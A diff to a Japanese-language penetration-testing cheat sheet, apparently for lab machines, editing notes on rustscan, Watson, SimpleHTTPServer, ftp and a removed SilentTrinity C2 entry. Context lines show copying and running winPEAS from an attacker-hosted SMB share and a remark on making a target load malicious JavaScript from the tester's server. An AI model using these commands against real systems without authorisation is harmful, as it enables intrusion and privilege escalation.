@@ -8,7 +8,7 @@
 
 ### rustscan
 - installation: `sudo snap install -y rustscan`
-- 全ポートスキャン: `rustscan -a $IP --ulimit 10000 -- -Pn -A --script vuln > rustscan.log`
+- 全ポートスキャン: `rustscan -a $IP --ulimit 10000 -- -sS -Pn -A > rustscan.log`
 
 ### gobuster
 - ディレクトリやファイルの探索
@@ -27,6 +27,9 @@
   2. リモートでダウンロード: `copy \\10.10.14.23\share\x64\Release\winPEASx64.exe`
   3. winPEAS を実行: `./winPEAS.exe`
 
+### Watson
+- Windows OS でパッチ未適用などによる脆弱性を探す
+- 
 
 ## Password Cracking
 ### hydra
@@ -93,6 +96,7 @@
 ### SimpleHTTPserver
 - カレントディレクトリをルートとした簡易Webサーバを立てることができる．
   - `sudo python -m SimpleHTTPServer [port]`
+  - ファイル転送に活用
 - 対象サーバで `<script src="http://.../a.js">`により任意の悪意のあるJavaScriptを実行させることなどが可能
 
 ### smbserver.py
@@ -100,6 +104,5 @@
 
 
 ## Miscellaneous
-
-### SilentTrinity
-- C2 server を立てることができる
+### ftp
+- `put [src] [dst]`: ファイル転送
